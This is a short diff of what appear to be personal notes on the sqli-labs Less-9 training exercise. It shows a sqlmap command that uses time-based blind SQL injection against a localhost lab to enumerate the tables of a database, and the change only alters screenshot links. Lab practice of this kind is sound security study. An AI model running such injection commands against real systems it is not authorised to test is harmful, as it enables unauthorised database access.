@@ -107,4 +107,4 @@ py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T --dbs
 ```
 py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T -D security --tables --time-sec=5 --batch --flush-session
 ```
-![[Pasted image 20261113192737.png]]
+## ![[Pasted image 20261113192737.png]]![[Pasted image 20261113203007.png]]10
